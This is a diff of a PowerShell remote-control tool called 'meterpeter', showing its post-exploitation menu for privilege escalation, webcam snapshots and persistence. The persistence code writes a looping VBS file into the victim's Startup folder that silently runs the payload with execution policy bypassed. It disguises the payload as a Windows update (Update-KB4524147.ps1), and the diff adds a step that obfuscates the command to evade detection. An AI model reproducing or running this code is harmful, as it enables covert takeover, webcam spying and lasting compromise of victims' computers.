@@ -824,7 +824,7 @@ While($Client.Connected)
       write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
       write-host "`n`n :meterpeter:Post> " -NoNewline -ForeGroundColor Green;
       $choise = Read-Host;
-      If($choise -eq "Escalate" -or $choice -eq "escalate")
+      If($choise -eq "Escalate" -or $choice -eq "escal")
       {
         write-host "`n`n   Modules     Description                  Remark" -ForegroundColor green;
         write-host "   -------     -----------                  ------";
@@ -839,9 +839,9 @@ While($Client.Connected)
           $File = "$Bin$name"
           If(([System.IO.File]::Exists("$File")))
           {
-            write-host " - Input Delay Time (sec): " -NoNewline;
+            write-host " - Input Delay Time (eg: 120): " -NoNewline;
             $Input_Delay = Read-Host;
-            If(-not ($Input_Delay)){$Input_Delay = "120"}
+            If(-not($Input_Delay)){$Input_Delay = "120"}
             $trigger = "WStore.vbs";
             $trigger_File = "$IPATH$trigger";
             $Delay_Time = "$Input_Delay"+"000";
@@ -889,14 +889,14 @@ While($Client.Connected)
           $Input_Delay = $Null;
         }
       }
-      If($choise -eq "CamSnap" -or $choise -eq "snap")
+      If($choise -eq "CamSnap" -or $choise -eq "cam")
       {
         write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
         write-host "   -------   -----------                     ------";
         write-host "   Device    List WebCam Devices             Client:User  - Privileges required";
         write-host "   Snap      Take WebCam Screenshot          Client:User:Admin  - Privs required";
         write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
-        write-host "`n`n :meterpeter:Post:Snap> " -NoNewline -ForeGroundColor Green;
+        write-host "`n`n :meterpeter:Post:Cam> " -NoNewline -ForeGroundColor Green;
         $Cam_choise = Read-Host;
         If($Cam_choise -eq "Snap" -or $Cam_choise -eq "snap")
         {
@@ -950,7 +950,7 @@ While($Client.Connected)
           $Cam_choise = $Null;
         }
       }
-      If($choise -eq "Persist" -or $choise -eq "persist")
+      If($choise -eq "Persist" -or $choise -eq "persistance")
       {
         write-host "`n   Requirements" -ForegroundColor Yellow;
         write-host "   ------------";
@@ -968,7 +968,6 @@ While($Client.Connected)
         $startup_choise = Read-Host;
         If($startup_choise -eq "StartUp" -or $startup_choise -eq "up")
         {
-          ## If Available use powershell -version 2 {AMSI Logging Evasion}
           write-host " Execute Client ($payload_name.ps1) On Every StartUp." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
           Write-Host "   Persist                Trigger Remote Path" -ForeGroundColor green;
           Write-Host "   -------                -------------------";
@@ -979,15 +978,16 @@ While($Client.Connected)
         If($startup_choise -eq "Beacon" -or $startup_choise -eq "Beacon")
         {
           $BeaconTime = $Null;
-          Write-host " - Input Time (sec) to beacon home (eg. 60000): " -NoNewline;
-          $BeaconTime = Read-Host;
+          Write-host " - Input Time (sec) to beacon home (eg: 60): " -NoNewline;
+          $Delay_Time = Read-Host;
+          $BeaconTime = "$Delay_Time"+"000";
           If(-not($BeaconTime)){$BeaconTime = "60000"}
-          ## If Available use powershell -version 2 {AMSI Logging Evasion}
           write-host " Execute Client ($payload_name.ps1) with $BeaconTime (sec) loop." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
           Write-Host "   Persist                Remote Path (trigger)" -ForeGroundColor green;
           Write-Host "   -------                ---------------------";
           Write-Host "   Update-KB4524147.ps1   `$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`n";
           $Command = "echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'Do' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'wscript.sleep $BeaconTime' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'objShell.Run `"cmd.exe /R powershell.exe -Exec Bypass -Win 1 -File %tmp%\$payload_name.ps1`", 0, True' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'Loop' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo `"   [i] Client $Payload_name.ps1 successful Persisted ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";          
+          $Command = Variable_Obfuscation(Character_Obfuscation($Command));
           }
         If($startup_choise -eq "RUNONCE" -or $startup_choise -eq "once")
         {
